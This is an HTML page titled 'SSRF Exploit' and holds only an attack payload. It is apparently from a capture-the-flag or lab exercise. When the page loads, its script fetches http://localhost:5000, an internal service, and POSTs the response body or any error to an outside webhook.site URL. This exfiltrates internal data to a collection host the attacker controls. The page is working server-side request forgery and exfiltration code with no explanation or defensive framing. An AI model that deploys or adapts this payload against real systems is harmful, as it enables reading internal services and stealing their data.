<!DOCTYPE html>
<html>
<head>
    <title>SSRF Exploit</title>
    <script>
        // Step 1: Fetch content from localhost:5000
        fetch('http://localhost:5000')
            .then(response => response.text()) // Read response as text
            .then(data => {
                // Step 2: Send the fetched data to your webhook
                fetch('https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e', {
                    method: 'POST', // Send as a POST request
                    headers: { 'Content-Type': 'application/json' }, // Content-Type for JSON
                    body: JSON.stringify({ response: data }) // Send the data in JSON format
                });
            })
            .catch(error => {
                // Step 3: Handle errors and send them to your webhook
                fetch('https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ error: error.message })
                });
            });
    </script>
</head>
<body>
    <p>Fetching content from localhost:5000 and sending to webhook...</p>
</body>
</html>
